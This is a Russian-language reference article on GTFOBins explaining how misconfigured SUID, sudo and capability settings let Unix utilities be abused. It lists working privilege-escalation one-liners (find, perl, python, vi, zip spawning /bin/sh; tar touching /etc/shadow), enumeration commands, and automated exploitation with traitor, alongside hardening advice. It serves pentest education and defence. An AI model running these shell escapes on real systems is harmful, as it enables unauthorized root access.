# GTFOBins

## Определения

**GTFOBins** ([gtfobins.github.io](https://gtfobins.github.io/)) — курируемый список Unix-бинарников, которые могут быть использованы для обхода локальных ограничений безопасности в неправильно настроенных системах.

Это **не инструмент**, а база знаний (сайт + GitHub-репозиторий), документирующая техники эксплуатации легитимных системных утилит.

**Аналог для Windows:** [**LOLBAS**](https://lolbas-project.github.io/) (Living Off The Land Binaries, Scripts and Libraries) — аналогичный проект для ОС Windows, описывающий использование встроенных компонентов для обхода защиты.

## Основные концепции

### Принцип работы

Каждая запись в GTFOBins описывает один бинарный файл и набор техник его нестандартного использования для:

- **Повышения привилегий** — получение root-доступа через SUID-бит, sudo-права, capabilities.
- **Пост-эксплуатации** — reverse shell, чтение/запись файлов, обход ограничений оболочки.
- **Обхода ограничений** — выполнение команд в restricted shell (rbash, rssh), передача файлов.

### Категории техник

GTFOBins классифицирует техники по контексту эксплуатации:

| Категория | Описание | Пример |
|---|---|---|
| **SUID** | Бинарник с SUID-битом выполняется от имени владельца (часто root) | `find . -exec /bin/sh \; -quit` |
| **sudo** | Запуск через `sudo` с расширенными возможностями | `sudo find . -exec /bin/sh \; -quit` |
| **Capabilities** | Linux capabilities (`cap_setuid`, `cap_dac_override`) | `python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'` |
| **Docker** | Эксплуатация через контейнеры или writable `docker.sock` | Монтирование host-filesystem в контейнер |
| **Restricted Shell** | Обход ограничений rbash, rssh | `vi` → `:!sh` |
| **File Read/Write** | Чтение/запись произвольных файлов через утилиту | `tar -cf /dev/null /etc/shadow --checkpoint=1` |
| **Shell Escape** | Получение полноценной оболочки из ограниченной | `awk 'BEGIN {system("/bin/sh")}'` |

### Взаимосвязь с механизмами безопасности

1.  **SUID-бит:** Ключевой вектор. Бинарник с SUID выполняется с правами владельца файла. Если утилита позволяет выполнять произвольный код, это ведет к немедленному захвату прав владельца (обычно `root`).
    > **Подробно:** [Специальные права: SUID/SGID](../../Linux/Security/Concepts/File_Permissions/special_permissions.md).
2.  **Capabilities:** Гранулярные привилегии. Даже если у бинарника нет SUID-бита, наличие `cap_setuid` позволяет ему сменить UID на 0.
    > **Подробно:** [Linux Capabilities](../../Linux/Security/Mechanisms/Capabilities.md).
3.  **Sudoers:** Неправильная настройка `/etc/sudoers` (например, разрешение запуска `vi` или `find` без пароля) позволяет пользователю «покинуть» утилиту и получить shell от имени `root`.

## Практические сценарии

### Поиск векторов эскалации

```bash
# 1. Поиск файлов с SUID/SGID битами
find / -type f \( -perm -4000 -o -perm -2000 \) 2>/dev/null

# 2. Поиск файлов с установленными Capabilities
getcap -r / 2>/dev/null

# 3. Проверка разрешенных команд через sudo
sudo -l
```

### Примеры эксплуатации популярных утилит

#### Bash (SUID)
Если бинарник `bash` имеет SUID-бит (ошибка конфигурации), он может сбросить привилегии. Опция `-p` (privileged mode) предотвращает это:
```bash
/usr/bin/bash -p
```

#### Perl / Ruby / Python (sudo)
Скриптовые языки позволяют выполнить произвольный код одной строкой:
```bash
# Perl
sudo perl -e 'exec "/bin/sh";'

# Ruby
sudo ruby -e 'exec "/bin/sh"'

# Python
sudo python3 -c 'import os; os.system("/bin/sh")'
```

#### Find (SUID/sudo)
Использование встроенного ключа выполнения команд:
```bash
sudo find . -exec /bin/sh \; -quit
```

#### Vi / Vim (Shell Escape)
Выход в оболочку из текстового редактора:
```text
:!sh
# или
:set shell=/bin/sh
:shell
```

#### Zip / Tar (File Read/Shell)
Эксплуатация через опции выполнения команд или архивацию чувствительных файлов:
```bash
# Zip
sudo zip /tmp/test.zip /etc/shadow -T --unzip-command="sh -c /bin/sh"
```

### Автоматизация с помощью `traitor`

Инструмент [traitor](./traitor.md) автоматизирует проверку бинарников на соответствие техникам GTFOBins:
```bash
# Сканирование и попытка автоматической эксплуатации
traitor -a
```

## Меры защиты (Hardening)

1.  **Принцип минимизации SUID:** Удаляйте SUID-бит с утилит, где он не обязателен.
    ```bash
    chmod u-s /usr/bin/binary
    ```
2.  **Безопасный Sudo:** При настройке `/etc/sudoers` используйте `NOEXEC`, чтобы запретить запускаемым программам порождать дочерние процессы (оболочки).
    ```text
    user ALL=(ALL) NOEXEC: /usr/bin/find
    ```
3.  **No New Privileges:** Используйте флаг `no_new_privs` для процессов (в Systemd, Docker, K8s), чтобы предотвратить получение новых прав через SUID/Capabilities.
4.  **Аудит (Auditd):** Настройте мониторинг выполнения команд с высокими привилегиями и аномального поведения (например, запуск `sh` из `vi`).
5.  **Системы принудительного контроля (MAC):** AppArmor и SELinux могут блокировать выполнение оболочек из приложений, которым это не свойственно по профилю.

## Дополнительная информация

### Применение

- **CTF-соревнования** — базовый ресурс для эскалации привилегий.
- **Пентест / Red Team** — справочник техник для аудита конфигурации и пост-эксплуатации.
- **DevOps / SRE** — чек-лист для аудита безопасности образов и хостов.

### Интеграция с инструментами сканирования

GTFOBins является «движком» техник для:
- [**traitor**](./traitor.md) — локальная эскалация привилегий.
- **LinPEAS / LinuxSmartEnumeration** — скрипты всестороннего аудита системы.

### Связанные ресурсы

- [Специальные права: SUID/SGID](../../Linux/Security/Concepts/File_Permissions/special_permissions.md) — глубокий разбор механизмов.
- [Linux Capabilities](../../Linux/Security/Mechanisms/Capabilities.md) — гранулярное управление правами.
- [traitor](./traitor.md) — автоматизация эксплуатации.
- [Hardening контейнеров](../../Docker/Docker_security/container_hardening.md) — защита в облачных средах.
- [Управление привилегиями](../../Linux/SystemAdministration/privilege_management.md) — архитектура `sudo` и системные вызовы.
